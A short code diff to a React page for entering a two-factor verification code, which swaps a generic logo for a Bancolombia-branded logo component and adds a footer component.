@@ -1,5 +1,6 @@
-import Logo from "./components/Logo";
+import AppLogoBancolombia from "./components/AppLogoBancolombia";
 import CodeForm from "./components/CodeForm";
+import AppFooter from "./components/AppFooter";
 
 export default function CodePage({ searchParams }) {
   const initialStep = parseInt(searchParams?.step, 10) || 1;
@@ -8,7 +9,7 @@ export default function CodePage({ searchParams }) {
   return (
     <main className="svp-main">
       <div className="bc-container-fluid trazo" style={{ backgroundImage: "url(/assets/images/trazo.svg)" }}>
-        <Logo />
+        <AppLogoBancolombia />
         <h1 className="bc-text-center bc-cibsans-font-style-9-extralight bc-mt-4 bc-fs-xs">
           Verificación de código 2FA
         </h1>
@@ -19,6 +20,7 @@ export default function CodePage({ searchParams }) {
           </div>
         </div>
       </div>
+      <AppFooter />
     </main>
   );
 }
